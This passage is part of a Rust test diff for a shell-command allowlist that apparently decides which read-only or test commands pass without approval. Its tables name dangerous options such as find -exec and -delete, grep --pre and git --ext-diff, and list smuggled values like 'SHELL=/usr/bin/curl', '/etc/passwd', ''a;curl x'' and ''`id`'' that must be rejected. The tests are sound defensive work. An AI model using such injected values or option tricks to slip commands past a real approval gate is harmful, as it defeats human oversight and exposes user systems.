+        "git commit -am x",
+        "find . -exec ls ;",
+    ];
+
+    fn random_command(rng: &mut Rng) -> String {
+        let (command, more) = rng.pick(&READ_ONLY);
+        let mut words = vec![command.to_string()];
+        for _ in 0..rng.next() % 3 {
+            words.push(rng.pick(more).to_string());
+        }
+        words.join(" ")
+    }
+
+    fn random_commands(rng: &mut Rng) -> Vec<String> {
+        (0..1 + rng.next() % 4)
+            .map(|_| random_command(rng))
+            .collect()
+    }
+
+    /// The options of a command of [`READ_ONLY`], `None` for `find` and `echo`.
+    fn options_of(command: &str) -> Option<&'static Options> {
+        let mut words = command.split(' ');
+        let program = words.next().unwrap();
+        let table: &'static [(&str, Options)] = match program {
+            "git" => &GIT,
+            _ => &READERS,
+        };
+        let name = if program == "git" {
+            words.next().unwrap()
+        } else {
+            program
+        };
+        table.iter().find(|(n, _)| *n == name).map(|(_, o)| o)
+    }
+
+    /// What writes, runs a program, follows links while it walks, reads a list of files or the environment.
+    const DANGEROUS: [(&str, &[&str]); 8] = [
+        (
+            "sort",
+            &[
+                "-o",
+                "-T",
+                "--output",
+                "--temporary-directory",
+                "--compress-program",
+                "--files0-from",
+                "--random-source",
+            ],
+        ),
+        ("wc", &["--files0-from"]),
+        (
+            "ls",
+            &["-L", "-H", "--dereference", "--dereference-command-line"],
+        ),
+        (
+            "grep",
+            &[
+                "-R",
+                "-S",
+                "-O",
+                "-f",
+                "-z",
+                "-Z",
+                "--dereference-recursive",
+                "--file",
+                "--filter",
+                "--pager",
+                "--view",
+                "--config",
+                "--save-config",
+            ],
+        ),
+        (
+            "rg",
+            &[
+                "-L",
+                "-f",
+                "-z",
+                "--follow",
+                "--pre",
+                "--pre-glob",
+                "--hostname-bin",
+                "--search-zip",
+                "--file",
+                "--ignore-file",
+            ],
+        ),
+        ("tail", &["-f", "-F", "--follow"]),
+        (
+            "jq",
+            &[
+                "-f",
+                "-L",
+                "--from-file",
+                "--rawfile",
+                "--slurpfile",
+                "--args",
+                "--jsonargs",
+            ],
+        ),
+        (
+            "git",
+            &[
+                "-O",
+                "-L",
+                "--output",
+                "--ext-diff",
+                "--textconv",
+                "--no-index",
+            ],
+        ),
+    ];
+    const FIND_DANGEROUS: [&str; 13] = [
+        "-L",
+        "-H",
+        "-follow",
+        "-files0-from",
+        "-exec",
+        "-execdir",
+        "-ok",
+        "-okdir",
+        "-delete",
+        "-fprint",
+        "-fprint0",
+        "-fprintf",
+        "-fls",
+    ];
+
+    /// An option `options` does not have, in any of the forms a program reads: a long name that is none of its
+    /// own, abbreviated or not, glued to a value or followed by one; a short one alone, in a cluster of its flags,
+    /// glued to a value. `dangerous`: the options to start from, else made up.
+    fn unknown_option(rng: &mut Rng, options: &Options, dangerous: &[&str]) -> String {
+        let letters: Vec<char> = ('a'..='z').chain('A'..='Z').collect();
+        let base = match dangerous.is_empty() || rng.next().is_multiple_of(3) {
+            true if rng.next().is_multiple_of(2) => {
+                let name: String = (0..1 + rng.next() % 14)
+                    .map(|_| *rng.pick(&['a', 'e', 'f', 'i', 'l', 'o', 'r', 's', 't', '-']))
+                    .collect();
+                format!("--{name}")
+            }
+            true => format!("-{}", rng.pick(&letters)),
+            false => rng.pick(dangerous).to_string(),
+        };
+        let own = |long: &str| options.long.iter().any(|o| o.trim_end_matches('=') == long);
+        let option = if let Some(name) = base.strip_prefix("--") {
+            // Abbreviated, as getopt_long and git take it, unless that names an option of its own.
+            let cut = 1 + (rng.next() as usize % name.len());
+            let short = format!("--{}", &name[..cut]);
+            match rng.next().is_multiple_of(2) && !own(&short) {
+                true => short,
+                false => base.clone(),
+            }
+        } else {
+            base.clone()
+        };
+        if option.starts_with("--") && own(&option) {
+            return unknown_option(rng, options, dangerous);
+        }
+        let letter = option.chars().nth(1).unwrap();
+        if !option.starts_with("--")
+            && (options.flags.contains(letter) || options.valued.contains(letter))
+        {
+            return unknown_option(rng, options, dangerous);
+        }
+        match rng.next() % 4 {
+            0 => option,
+            1 => format!("{option} v"),
+            2 if option.starts_with("--") => format!("{option}=v"),
+            2 => format!("{option}v"),
+            _ if option.starts_with("--") => option,
+            // Among its own flags, before or after: never after a flag that takes a value.
+            _ => {
+                let flags: Vec<char> = options.flags.chars().collect();
+                let count = if flags.is_empty() { 0 } else { rng.next() % 3 };
+                let mut cluster: Vec<char> = (0..count).map(|_| *rng.pick(&flags)).collect();
+                let at = (rng.next() as usize) % (cluster.len() + 1);
+                cluster.insert(at, letter);
+                format!("-{}", cluster.into_iter().collect::<String>())
+            }
+        }
+    }
+
+    #[test]
+    fn no_option_a_program_does_not_list_passes() {
+        let wt = worktree("options");
+        let mut rng = Rng(0x5851_f42d_4c95_7f2d);
+        for _ in 0..6000 {
+            let command = random_command(&mut rng);
+            assert!(reads(&command, &wt, &wt, &checks()), "{command:?}");
+            let program = command.split(' ').next().unwrap();
+            let option = match options_of(&command) {
+                Some(options) => {
+                    let dangerous = DANGEROUS
+                        .iter()
+                        .find(|(p, _)| *p == program)
+                        .map_or(&[][..], |(_, d)| d);
+                    unknown_option(&mut rng, options, dangerous)
+                }
+                None if program == "find" => rng.pick(&FIND_DANGEROUS).to_string(),
+                // echo prints its words, options or not.
+                None => continue,
+            };
+            let mut words: Vec<&str> = command.split(' ').collect();
+            let place = 1 + (rng.next() % words.len() as u64) as usize;
+            words.insert(place, &option);
+            let line = words.join(" ");
+            assert!(!reads(&line, &wt, &wt, &checks()), "{line:?} let through");
+        }
+    }
+
+    fn join(rng: &mut Rng, commands: &[String]) -> String {
+        let mut line = commands[0].clone();
+        for c in &commands[1..] {
+            line.push_str(rng.pick(&JOINS));
+            line.push_str(c);
+        }
+        line
+    }
+
+    #[test]
+    fn reading_commands_pass_and_any_other_construct_asks() {
+        let wt = worktree("property");
+        let mut rng = Rng(0x2545_f491_4f6c_dd1d);
+        for _ in 0..3000 {
+            let commands = random_commands(&mut rng);
+            let line = join(&mut rng, &commands);
+            assert!(reads(&line, &wt, &wt, &checks()), "{line:?}");
+
+            // One bad word in any command, at any place after its program.
+            let mut bad = commands.clone();
+            let at = (rng.next() % bad.len() as u64) as usize;
+            let mut words: Vec<&str> = bad[at].split(' ').collect();
+            let place = 1 + (rng.next() % words.len() as u64) as usize;
+            words.insert(place, rng.pick(&ANYWHERE));
+            bad[at] = words.join(" ");
+            let line = join(&mut rng, &bad);
+            assert!(!reads(&line, &wt, &wt, &checks()), "{line:?} let through");
+
+            // One command that is not a read, anywhere in the line.
+            let mut bad = commands.clone();
+            let at = (rng.next() % (bad.len() as u64 + 1)) as usize;
+            bad.insert(at, rng.pick(&AS_COMMAND).to_string());
+            let line = join(&mut rng, &bad);
+            assert!(!reads(&line, &wt, &wt, &checks()), "{line:?} let through");
+        }
+        // Any text: what passes is made of listed programs only, never of a construct of the shell.
+        let alphabet: Vec<char> = "catls grep$`'\"\\;&|()<>{}\n#~/.-=*é".chars().collect();
+        for _ in 0..4000 {
+            let len = rng.next() % 24;
+            let line: String = (0..len).map(|_| *rng.pick(&alphabet)).collect();
+            if reads(&line, &wt, &wt, &[]) {
+                let parts = segments(&line).unwrap();
+                assert!(
+                    parts.iter().all(|w| {
+                        ["git", "find", "echo"].contains(&w[0].as_str())
+                            || READERS.iter().any(|(name, _)| *name == w[0])
+                    }),
+                    "{line:?}"
+                );
+                assert!(
+                    !line.contains(['$', '`', '(', ')', '<', '{', '}', '#', '~']),
+                    "{line:?}"
+                );
+            }
+        }
+    }
+
+    /// The checks of [`a_check_takes_plain_paths_only`], and plain paths they may take more of.
+    const CHECKS: [&str; 5] = [
+        "npm test",
+        "make test",
+        "go test ./...",
+        "cargo test",
+        "cd app && pnpm check",
+    ];
+    const PLAIN: [&str; 8] = [
+        "src",
+        "src/app.test.js",
+        "./pkg/...",
+        "README.md",
+        "a_b-c.d",
+        "tests/unit/",
+        "é2",
+        "x/./y",
+    ];
+    /// Never let through after a check: an option, a value, a path out of the worktree, a word of the shell.
+    const NOT_PLAIN: [&str; 26] = [
+        "-x",
+        "-",
+        "--",
+        "--config=x",
+        "-exec",
+        "SHELL=/usr/bin/curl",
+        "SHELL=sh",
+        "a=b",
+        "=curl",
+        "/etc/passwd",
+        "~/x",
+        "~",
+        "../x",
+        "src/../x",
+        "..",
+        "out/secret",
+        "'a b'",
+        "'a;curl x'",
+        "\"a|b\"",
+        "'$x'",
+        "'`id`'",
+        "'-x'",
+        "'*'",
+        r"'a\b'",
+        "'x:y'",
+        "'a\nb'",
+    ];
+
+    #[test]
+    fn a_check_takes_plain_paths_only() {
+        let wt = worktree("plain");
+        let checks: Vec<String> = CHECKS.map(String::from).to_vec();
+        let pass = |line: &str| reads(line, &wt, &wt, &checks);
+        let mut rng = Rng(0x94d0_49bb_1331_11eb);
+        for _ in 0..4000 {
+            let check = rng.pick(&CHECKS);
+            let mut more: Vec<&str> = (0..rng.next() % 4).map(|_| *rng.pick(&PLAIN)).collect();
+            let line = format!("{check} {}", more.join(" "));
+            assert!(pass(&line), "{line:?}");
+            let at = (rng.next() % (more.len() as u64 + 1)) as usize;
+            more.insert(at, rng.pick(&NOT_PLAIN));
+            let line = format!("{check} {}", more.join(" "));
+            assert!(!pass(&line), "{line:?} let through");
+        }
+        // Any words after a check: what passes is plain, never an option, a value or a word of the shell.
+        let alphabet: Vec<char> = "ab./-_=~:;$`'\" |&*?é\\\n".chars().collect();
+        for _ in 0..6000 {
+            let check = rng.pick(&CHECKS);
+            let more: String = (0..1 + rng.next() % 12)
+                .map(|_| *rng.pick(&alphabet))
+                .collect();
+            let line = format!("{check} {more}");
+            if !pass(&line) {
+                continue;
+            }
+            let parts = segments(&line).unwrap();
+            let own = segments(check).unwrap().last().unwrap().len();
+            for word in &parts.last().unwrap()[own..] {
+                assert!(
+                    !word.starts_with(['-', '/', '~', '='])
+                        && !word.contains(['=', ':', '\\'])
+                        && !word.split('/').any(|p| p == "..")
+                        && word
+                            .chars()
+                            .all(|c| c.is_alphanumeric() || "._-/".contains(c)),
+                    "{line:?} let {word:?} through"
+                );
+            }
         }
     }
 }
